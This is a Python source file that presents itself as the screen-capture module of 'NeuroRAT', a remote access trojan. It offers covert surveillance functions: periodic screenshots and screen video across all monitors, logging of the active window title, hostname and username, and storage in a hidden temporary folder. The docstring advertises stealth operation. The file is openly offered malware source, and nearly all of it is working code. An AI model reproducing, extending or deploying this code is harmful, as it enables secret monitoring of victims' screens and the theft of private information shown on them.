#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Screen Capture Module for NeuroRAT
Author: Mr. Thomas Anderson (iamnobodynothing@gmail.com)
License: MIT

This module provides functionality to:
- Take screenshots at regular intervals
- Record screen video capture
- Support for multiple monitors
- Low CPU/memory usage
- Stealth operation (hidden processes)
- Metadata collection about screen resolution, window focus, etc.
"""

import os
import cv2
import time
import json
import base64
import shutil
import logging
import platform
import tempfile
import threading
import subprocess
from datetime import datetime
from PIL import Image, ImageGrab

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("NeuroRAT_ScreenCapture")

# Determine OS type
SYSTEM = platform.system().lower()

try:
    # Try importing platform-specific dependencies
    if SYSTEM == "windows":
        import win32gui
        import win32con
        import win32api
    elif SYSTEM == "darwin":  # macOS
        from AppKit import NSWorkspace, NSScreen
        from Quartz import CGWindowListCopyWindowInfo, kCGWindowListOptionOnScreenOnly, kCGNullWindowID
    else:  # Linux
        import gi
        gi.require_version('Gdk', '3.0')
        from gi.repository import Gdk
except ImportError as e:
    logger.error(f"Failed to import required modules: {e}")
    logger.error("Please install the required dependencies:")
    if SYSTEM == "windows":
        logger.error("pip install pywin32 opencv-python pillow")
    elif SYSTEM == "darwin":
        logger.error("pip install pyobjc-framework-Quartz opencv-python pillow")
    else:
        logger.error("pip install pygobject opencv-python pillow")

# Class for screen capture functionality
class ScreenCapture:
    """Screen capture functionality for NeuroRAT"""
    
    def __init__(self, output_dir=None, quality=80, interval=10, stealth=True):
        """
        Initialize the screen capture module
        
        Args:
            output_dir (str): Directory to save captures. If None, uses temporary directory
            quality (int): JPEG quality (1-100)
            interval (int): Seconds between captures in screenshot mode
            stealth (bool): Whether to operate in stealth mode
        """
        # Set up output directory
        if output_dir:
            self.output_dir = output_dir
            os.makedirs(output_dir, exist_ok=True)
        else:
            # Create a hidden directory in temp
            temp_dir = os.path.join(tempfile.gettempdir(), ".sc_data")
            os.makedirs(temp_dir, exist_ok=True)
            self.output_dir = temp_dir
        
        # Create subdirectories
        self.screenshots_dir = os.path.join(self.output_dir, "screenshots")
        self.videos_dir = os.path.join(self.output_dir, "videos")
        os.makedirs(self.screenshots_dir, exist_ok=True)
        os.makedirs(self.videos_dir, exist_ok=True)
        
        # Initialize configuration
        self.quality = min(max(quality, 1), 100)  # Ensure quality is between 1-100
        self.interval = max(interval, 1)  # Ensure interval is at least 1 second
        self.stealth = stealth
        self.running = False
        self.video_thread = None
        self.screenshot_thread = None
        self.stop_event = threading.Event()
        
        # Get screen information
        self.screen_info = self._get_screen_info()
        logger.info(f"Screen Capture initialized. Output directory: {self.output_dir}")
        logger.info(f"Screen info: {self.screen_info}")
    
    def _get_screen_info(self):
        """Get information about available screens/monitors"""
        screens = []
        
        try:
            if SYSTEM == "windows":
                def callback(monitor, dc, rect, data):
                    monitor_info = {
                        "id": len(screens),
                        "left": rect[0],
                        "top": rect[1],
                        "width": rect[2] - rect[0],
                        "height": rect[3] - rect[1],
                        "is_primary": False  # Will set primary later
                    }
                    screens.append(monitor_info)
                    return True
                
                win32api.EnumDisplayMonitors(None, None, callback, None)
                
                # Find primary monitor
                primary_info = win32api.GetMonitorInfo(win32api.MonitorFromPoint((0, 0)))
                primary_rect = primary_info.get("Monitor")
                
                for screen in screens:
                    if (screen["left"] == primary_rect[0] and 
                        screen["top"] == primary_rect[1] and 
                        screen["width"] == primary_rect[2] - primary_rect[0] and 
                        screen["height"] == primary_rect[3] - primary_rect[1]):
                        screen["is_primary"] = True
                        break
                
            elif SYSTEM == "darwin":
                for i, screen in enumerate(NSScreen.screens()):
                    frame = screen.frame()
                    screen_info = {
                        "id": i,
                        "left": int(frame.origin.x),
                        "top": int(frame.origin.y),
                        "width": int(frame.size.width),
                        "height": int(frame.size.height),
                        "is_primary": (i == 0)  # Assuming first screen is primary
                    }
                    screens.append(screen_info)
                
            else:  # Linux
                display = Gdk.Display.get_default()
                for i in range(display.get_n_monitors()):
                    monitor = display.get_monitor(i)
                    geometry = monitor.get_geometry()
                    screen_info = {
                        "id": i,
                        "left": geometry.x,
                        "top": geometry.y,
                        "width": geometry.width,
                        "height": geometry.height,
                        "is_primary": monitor.is_primary()
                    }
                    screens.append(screen_info)
            
            # If no screens were detected, add at least one default screen
            if not screens:
                # Try getting a screenshot to determine size
                try:
                    img = ImageGrab.grab()
                    screens.append({
                        "id": 0,
                        "left": 0,
                        "top": 0,
                        "width": img.width,
                        "height": img.height,
                        "is_primary": True
                    })
                except:
                    # Fallback to common resolution if screenshot fails
                    screens.append({
                        "id": 0,
                        "left": 0,
                        "top": 0,
                        "width": 1920,
                        "height": 1080,
                        "is_primary": True
                    })
            
        except Exception as e:
            logger.error(f"Error getting screen info: {e}")
            # Provide a default screen with common resolution
            screens.append({
                "id": 0,
                "left": 0,
                "top": 0,
                "width": 1920,
                "height": 1080,
                "is_primary": True
            })
        
        return screens
    
    def _get_active_window_info(self):
        """Get information about the currently active window"""
        try:
            if SYSTEM == "windows":
                hwnd = win32gui.GetForegroundWindow()
                window_title = win32gui.GetWindowText(hwnd)
                rect = win32gui.GetWindowRect(hwnd)
                window_info = {
                    "title": window_title,
                    "left": rect[0],
                    "top": rect[1],
                    "width": rect[2] - rect[0],
                    "height": rect[3] - rect[1],
                    "pid": None  # Add process ID if needed
                }
                return window_info
                
            elif SYSTEM == "darwin":
                # Get active app
                active_app = NSWorkspace.sharedWorkspace().frontmostApplication()
                app_name = active_app.localizedName()
                
                # Get window title (if available)
                window_title = app_name
                window_info = {
                    "title": window_title,
                    "app": app_name,
                    "pid": active_app.processIdentifier(),
                    "left": 0, "top": 0, "width": 0, "height": 0  # Default values
                }
                
                # Try to get window geometry
                window_list = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID)
                for window in window_list:
                    if window['kCGWindowOwnerName'] == app_name:
                        if 'kCGWindowName' in window and window['kCGWindowName']:
                            window_title = f"{app_name} - {window['kCGWindowName']}"
                            window_info["title"] = window_title
                        
                        if 'kCGWindowBounds' in window:
                            bounds = window['kCGWindowBounds']
                            window_info.update({
                                "left": bounds['X'],
                                "top": bounds['Y'],
                                "width": bounds['Width'],
                                "height": bounds['Height']
                            })
                            break
                
                return window_info
                
            else:  # Linux
                # Use xprop to get window info
                try:
                    output = subprocess.check_output(
                        ['xprop', '-root', '_NET_ACTIVE_WINDOW'], 
                        universal_newlines=True
                    )
                    window_id = output.split()[-1]
                    
                    # Get window title
                    title_output = subprocess.check_output(
                        ['xprop', '-id', window_id, 'WM_NAME'], 
                        universal_newlines=True
                    )
                    title = title_output.split('=', 1)[1].strip().strip('"')
                    
                    # Get window geometry
                    geometry_output = subprocess.check_output(
                        ['xwininfo', '-id', window_id], 
                        universal_newlines=True
                    )
                    
                    # Extract geometry info
                    geom = {}
                    for line in geometry_output.splitlines():
                        if "Absolute upper-left X:" in line:
                            geom["left"] = int(line.split(':')[1].strip())
                        elif "Absolute upper-left Y:" in line:
                            geom["top"] = int(line.split(':')[1].strip())
                        elif "Width:" in line:
                            geom["width"] = int(line.split(':')[1].strip())
                        elif "Height:" in line:
                            geom["height"] = int(line.split(':')[1].strip())
                    
                    window_info = {
                        "title": title,
                        "id": window_id,
                        "left": geom.get("left", 0),
                        "top": geom.get("top", 0),
                        "width": geom.get("width", 0),
                        "height": geom.get("height", 0)
                    }
                    return window_info
                except:
                    # If xprop fails, return minimal info
                    return {"title": "Unknown", "left": 0, "top": 0, "width": 0, "height": 0}
        
        except Exception as e:
            logger.error(f"Error getting active window info: {e}")
            return {"title": "Unknown", "left": 0, "top": 0, "width": 0, "height": 0}
    
    def take_screenshot(self, include_metadata=True, monitor_id=None):
        """
        Take a screenshot of the specified monitor or all monitors
        
        Args:
            include_metadata (bool): Whether to include metadata in the saved file
            monitor_id (int): ID of the monitor to capture, or None for all
        
        Returns:
            dict: Information about the captured screenshot
        """
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.jpg"
            filepath = os.path.join(self.screenshots_dir, filename)
            
            # Get active window info
            window_info = self._get_active_window_info()
            
            # Take the screenshot
            if monitor_id is not None:
                # Capture specific monitor
                for screen in self.screen_info:
                    if screen["id"] == monitor_id:
                        # Capture the specific region for this monitor
                        bbox = (
                            screen["left"], 
                            screen["top"], 
                            screen["left"] + screen["width"], 
                            screen["top"] + screen["height"]
                        )
                        screenshot = ImageGrab.grab(bbox=bbox)
                        break
                else:
                    # Monitor ID not found, capture full screen
                    screenshot = ImageGrab.grab()
            else:
                # Capture full screen (all monitors)
                screenshot = ImageGrab.grab()
            
            # Save the screenshot
            screenshot.save(filepath, "JPEG", quality=self.quality)
            
            # Save metadata if requested
            if include_metadata:
                metadata = {
                    "timestamp": datetime.now().isoformat(),
                    "filename": filename,
                    "monitor_id": monitor_id,
                    "resolution": {
                        "width": screenshot.width,
                        "height": screenshot.height
                    },
                    "active_window": window_info,
                    "system_info": {
                        "platform": platform.platform(),
                        "system": platform.system(),
                        "release": platform.release(),
                        "hostname": platform.node(),
                        "username": os.getlogin()
                    }
                }
                
                metadata_filename = f"{os.path.splitext(filename)[0]}.json"
                metadata_path = os.path.join(self.screenshots_dir, metadata_filename)
                with open(metadata_path, "w") as f:
                    json.dump(metadata, f, indent=2)
            
            logger.info(f"Screenshot saved: {filepath}")
            
            return {
                "success": True,
                "filepath": filepath,
                "width": screenshot.width,
                "height": screenshot.height,
                "timestamp": timestamp,
                "active_window": window_info.get("title", "Unknown")
            }
            
        except Exception as e:
            logger.error(f"Error taking screenshot: {e}")
            return {"success": False, "error": str(e)}
    
    def _screenshot_loop(self):
        """Background thread for taking periodic screenshots"""
        logger.info(f"Starting screenshot loop with interval {self.interval} seconds")
        
        while not self.stop_event.is_set():
            try:
                self.take_screenshot()
                self.stop_event.wait(self.interval)
            except Exception as e:
                logger.error(f"Error in screenshot loop: {e}")
                self.stop_event.wait(self.interval)
    
    def start_screenshot_capture(self):
        """Start taking screenshots at regular intervals"""
        if self.screenshot_thread and self.screenshot_thread.is_alive():
            logger.warning("Screenshot capture is already running")
            return False
        
        try:
            self.stop_event.clear()
            self.screenshot_thread = threading.Thread(target=self._screenshot_loop, daemon=True)
            self.screenshot_thread.start()
            logger.info("Screenshot capture started")
            return True
        except Exception as e:
            logger.error(f"Error starting screenshot capture: {e}")
            return False
    
    def stop_screenshot_capture(self):
        """Stop taking screenshots"""
        if not self.screenshot_thread or not self.screenshot_thread.is_alive():
            logger.warning("Screenshot capture is not running")
            return False
        
        try:
            self.stop_event.set()
            self.screenshot_thread.join(timeout=2.0)
            logger.info("Screenshot capture stopped")
            return True
        except Exception as e:
            logger.error(f"Error stopping screenshot capture: {e}")
            return False
    
    def start_video_capture(self, duration=60, fps=10, monitor_id=None):
        """
        Start recording screen video
        
        Args:
            duration (int): Duration in seconds to record (0 for unlimited)
            fps (int): Frames per second
            monitor_id (int): ID of the monitor to capture, or None for all
        
        Returns:
            dict: Information about the video capture
        """
        if self.video_thread and self.video_thread.is_alive():
            logger.warning("Video capture is already running")
            return {"success": False, "error": "Video capture already running"}
        
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"video_{timestamp}.mp4"
            filepath = os.path.join(self.videos_dir, filename)
            
            # Determine which screen to capture
            if monitor_id is not None:
                for screen in self.screen_info:
                    if screen["id"] == monitor_id:
                        # Capture the specific region for this monitor
                        region = (
                            screen["left"], 
                            screen["top"], 
                            screen["width"], 
                            screen["height"]
                        )
                        break
                else:
                    # Monitor ID not found, use primary screen or first screen
                    for screen in self.screen_info:
                        if screen.get("is_primary", False):
                            region = (screen["left"], screen["top"], screen["width"], screen["height"])
                            break
                    else:
                        region = (
                            self.screen_info[0]["left"],
                            self.screen_info[0]["top"],
                            self.screen_info[0]["width"],
                            self.screen_info[0]["height"]
                        )
            else:
                # Full desktop capture - combine all monitors
                left = min(s["left"] for s in self.screen_info)
                top = min(s["top"] for s in self.screen_info)
                right = max(s["left"] + s["width"] for s in self.screen_info)
                bottom = max(s["top"] + s["height"] for s in self.screen_info)
                region = (left, top, right - left, bottom - top)
            
            # Start video capture in a separate thread
            self.stop_event.clear()
            video_info = {
                "filepath": filepath,
                "fps": fps,
                "duration": duration,
                "region": region,
                "start_time": datetime.now().isoformat()
            }
            
            self.video_thread = threading.Thread(
                target=self._video_capture_loop, 
                args=(video_info,),
                daemon=True
            )
            self.video_thread.start()
            
            # Save metadata
            metadata = {
                "timestamp": datetime.now().isoformat(),
                "filename": filename,
                "monitor_id": monitor_id,
                "fps": fps,
                "duration": duration,
                "region": {
                    "left": region[0],
                    "top": region[1],
                    "width": region[2],
                    "height": region[3]
                },
                "system_info": {
                    "platform": platform.platform(),
                    "system": platform.system(),
                    "release": platform.release(),
                    "hostname": platform.node(),
                    "username": os.getlogin()
                }
            }
            
            metadata_filename = f"{os.path.splitext(filename)[0]}.json"
            metadata_path = os.path.join(self.videos_dir, metadata_filename)
            with open(metadata_path, "w") as f:
                json.dump(metadata, f, indent=2)
            
            logger.info(f"Video capture started: {filepath}")
            
            return {
                "success": True,
                "filepath": filepath,
                "fps": fps,
                "duration": duration,
                "width": region[2],
                "height": region[3]
            }
            
        except Exception as e:
            logger.error(f"Error starting video capture: {e}")
            return {"success": False, "error": str(e)}
    
    def _video_capture_loop(self, video_info):
        """Background thread for video capture"""
        filepath = video_info["filepath"]
        fps = video_info["fps"]
        duration = video_info["duration"]
        region = video_info["region"]
        
        try:
            # Initialize video writer
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # or 'avc1' or 'H264'
            out = cv2.VideoWriter(filepath, fourcc, fps, (region[2], region[3]))
            
            start_time = time.time()
            frame_count = 0
            
            # Record frames until stopped or duration reached
            while not self.stop_event.is_set():
                if duration > 0 and time.time() - start_time > duration:
                    break
                
                # Capture screen region
                screenshot = ImageGrab.grab(bbox=(
                    region[0], region[1], 
                    region[0] + region[2], 
                    region[1] + region[3]
                ))
                
                # Convert PIL image to OpenCV format
                frame = cv2.cvtColor(numpy.array(screenshot), cv2.COLOR_RGB2BGR)
                
                # Write frame
                out.write(frame)
                frame_count += 1
                
                # Sleep to maintain desired frame rate
                time.sleep(1/fps)
            
            # Release resources
            out.release()
            
            # Save final metadata
            metadata_filename = f"{os.path.splitext(os.path.basename(filepath))[0]}.json"
            metadata_path = os.path.join(os.path.dirname(filepath), metadata_filename)
            
            if os.path.exists(metadata_path):
                with open(metadata_path, "r") as f:
                    metadata = json.load(f)
            else:
                metadata = {}
            
            metadata.update({
                "end_time": datetime.now().isoformat(),
                "actual_duration": time.time() - start_time,
                "frame_count": frame_count,
                "actual_fps": frame_count / (time.time() - start_time) if time.time() > start_time else 0,
                "file_size": os.path.getsize(filepath)
            })
            
            with open(metadata_path, "w") as f:
                json.dump(metadata, f, indent=2)
            
            logger.info(f"Video capture completed: {filepath} ({frame_count} frames, {time.time() - start_time:.2f} seconds)")
            
        except Exception as e:
            logger.error(f"Error in video capture loop: {e}")
    
    def stop_video_capture(self):
        """Stop recording video"""
        if not self.video_thread or not self.video_thread.is_alive():
            logger.warning("Video capture is not running")
            return False
        
        try:
            self.stop_event.set()
            self.video_thread.join(timeout=2.0)
            logger.info("Video capture stopped")
            return True
        except Exception as e:
            logger.error(f"Error stopping video capture: {e}")
            return False
    
    def list_captures(self):
        """List all captured screenshots and videos"""
        captures = {
            "screenshots": [],
            "videos": []
        }
        
        try:
            # List screenshots
            for filename in os.listdir(self.screenshots_dir):
                if filename.endswith(".jpg") or filename.endswith(".png"):
                    filepath = os.path.join(self.screenshots_dir, filename)
                    filestat = os.stat(filepath)
                    
                    # Look for metadata file
                    metadata_path = os.path.join(
                        self.screenshots_dir, 
                        f"{os.path.splitext(filename)[0]}.json"
                    )
                    
                    metadata = None
                    if os.path.exists(metadata_path):
                        try:
                            with open(metadata_path, "r") as f:
                                metadata = json.load(f)
                        except:
                            pass
                    
                    captures["screenshots"].append({
                        "filename": filename,
                        "filepath": filepath,
                        "size": filestat.st_size,
                        "created": datetime.fromtimestamp(filestat.st_ctime).isoformat(),
                        "metadata": metadata
                    })
            
            # List videos
            for filename in os.listdir(self.videos_dir):
                if filename.endswith(".mp4") or filename.endswith(".avi"):
                    filepath = os.path.join(self.videos_dir, filename)
                    filestat = os.stat(filepath)
                    
                    # Look for metadata file
                    metadata_path = os.path.join(
                        self.videos_dir, 
                        f"{os.path.splitext(filename)[0]}.json"
                    )
                    
                    metadata = None
                    if os.path.exists(metadata_path):
                        try:
                            with open(metadata_path, "r") as f:
                                metadata = json.load(f)
                        except:
                            pass
                    
                    captures["videos"].append({
                        "filename": filename,
                        "filepath": filepath,
                        "size": filestat.st_size,
                        "created": datetime.fromtimestamp(filestat.st_ctime).isoformat(),
                        "metadata": metadata
                    })
            
            return captures
        
        except Exception as e:
            logger.error(f"Error listing captures: {e}")
            return captures
    
    def clean_old_captures(self, max_age_days=7, max_size_mb=500):
        """
        Remove old captures to manage disk space
        
        Args:
            max_age_days (int): Maximum age in days to keep files
            max_size_mb (int): Maximum directory size in MB
        
        Returns:
            dict: Information about cleaned files
        """
        result = {
            "cleaned_screenshots": 0,
            "cleaned_videos": 0,
            "freed_space_mb": 0
        }
        
        try:
            # Calculate current usage
            total_size = 0
            for root, dirs, files in os.walk(self.output_dir):
                for file in files:
                    filepath = os.path.join(root, file)
                    total_size += os.path.getsize(filepath)
            
            total_size_mb = total_size / (1024 * 1024)
            
            # Check if we need to clean up
            if total_size_mb < max_size_mb:
                # Still check for old files
                now = time.time()
                max_age_seconds = max_age_days * 24 * 60 * 60
                
                # Clean old screenshots
                for filename in os.listdir(self.screenshots_dir):
                    filepath = os.path.join(self.screenshots_dir, filename)
                    if os.path.isfile(filepath):
                        file_age = now - os.path.getctime(filepath)
                        if file_age > max_age_seconds:
                            file_size = os.path.getsize(filepath)
                            os.remove(filepath)
                            result["cleaned_screenshots"] += 1
                            result["freed_space_mb"] += file_size / (1024 * 1024)
                
                # Clean old videos
                for filename in os.listdir(self.videos_dir):
                    filepath = os.path.join(self.videos_dir, filename)
                    if os.path.isfile(filepath):
                        file_age = now - os.path.getctime(filepath)
                        if file_age > max_age_seconds:
                            file_size = os.path.getsize(filepath)
                            os.remove(filepath)
                            result["cleaned_videos"] += 1
                            result["freed_space_mb"] += file_size / (1024 * 1024)
                
                return result
            
            # Need to clean up based on size too
            # Get all files with their creation times
            files_with_times = []
            
            # Screenshots
            for filename in os.listdir(self.screenshots_dir):
                filepath = os.path.join(self.screenshots_dir, filename)
                if os.path.isfile(filepath):
                    ctime = os.path.getctime(filepath)
                    size = os.path.getsize(filepath)
                    files_with_times.append((filepath, ctime, size, "screenshot"))
            
            # Videos
            for filename in os.listdir(self.videos_dir):
                filepath = os.path.join(self.videos_dir, filename)
                if os.path.isfile(filepath):
                    ctime = os.path.getctime(filepath)
                    size = os.path.getsize(filepath)
                    files_with_times.append((filepath, ctime, size, "video"))
            
            # Sort by creation time (oldest first)
            files_with_times.sort(key=lambda x: x[1])
            
            # Remove files until we're under the size limit
            for filepath, ctime, size, file_type in files_with_times:
                if total_size_mb <= max_size_mb:
                    break
                
                try:
                    os.remove(filepath)
                    total_size_mb -= size / (1024 * 1024)
                    result["freed_space_mb"] += size / (1024 * 1024)
                    
                    if file_type == "screenshot":
                        result["cleaned_screenshots"] += 1
                    else:
                        result["cleaned_videos"] += 1
                except:
                    pass
            
            return result
        
        except Exception as e:
            logger.error(f"Error cleaning old captures: {e}")
            return result

# Fix missing numpy import
try:
    import numpy
except ImportError:
    logger.error("Numpy module not found. Please install it: pip install numpy")

def start_video_recording(duration=60, fps=10, monitor_id=None, output_dir=None):
    """
    Start video recording of the screen
    
    Args:
        duration (int): Recording duration in seconds (0 for unlimited)
        fps (int): Frames per second
        monitor_id (int): ID of monitor to capture (None for all)
        output_dir (str): Output directory (None for default)
    
    Returns:
        dict: Status and recording information
    """
    try:
        # Create screen capture object
        capture = ScreenCapture(output_dir=output_dir)
        
        # Start video capture
        result = capture.start_video_capture(duration=duration, fps=fps, monitor_id=monitor_id)
        
        return {
            "success": result.get("success", False),
            "filepath": result.get("filepath", None),
            "screen_capture": capture
        }
    except Exception as e:
        logger.error(f"Error starting video recording: {e}")
        return {"success": False, "error": str(e)}

def start_screenshot_monitoring(interval=10, output_dir=None):
    """
    Start taking periodic screenshots
    
    Args:
        interval (int): Seconds between screenshots
        output_dir (str): Output directory (None for default)
    
    Returns:
        dict: Status and screenshot monitor information
    """
    try:
        # Create screen capture object
        capture = ScreenCapture(output_dir=output_dir, interval=interval)
        
        # Start screenshot capture
        success = capture.start_screenshot_capture()
        
        return {
            "success": success,
            "interval": interval,
            "output_dir": capture.output_dir,
            "screen_capture": capture
        }
    except Exception as e:
        logger.error(f"Error starting screenshot monitoring: {e}")
        return {"success": False, "error": str(e)}

def take_single_screenshot(output_dir=None, monitor_id=None):
    """
    Take a single screenshot
    
    Args:
        output_dir (str): Output directory (None for default)
        monitor_id (int): ID of monitor to capture (None for all)
    
    Returns:
        dict: Status and screenshot information
    """
    try:
        # Create screen capture object
        capture = ScreenCapture(output_dir=output_dir)
        
        # Take screenshot
        result = capture.take_screenshot(monitor_id=monitor_id)
        
        return {
            "success": result.get("success", False),
            "filepath": result.get("filepath", None),
            "timestamp": result.get("timestamp", None)
        }
    except Exception as e:
        logger.error(f"Error taking screenshot: {e}")
        return {"success": False, "error": str(e)}

if __name__ == "__main__":
    # If run directly, take a screenshot and start monitoring
    screenshot_result = take_single_screenshot()
    
    if screenshot_result["success"]:
        print(f"Screenshot saved: {screenshot_result['filepath']}")
    
    # Start screenshot monitoring (1 screenshot every 10 seconds)
    monitor_result = start_screenshot_monitoring(interval=10)
    
    if monitor_result["success"]:
        print(f"Screenshot monitoring started with interval {monitor_result['interval']} seconds")
        print(f"Press Ctrl+C to stop...")
        
        try:
            # Keep running until interrupted
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            # Stop screenshot monitoring
            monitor_result["screen_capture"].stop_screenshot_capture()
            print("Screenshot monitoring stopped.") 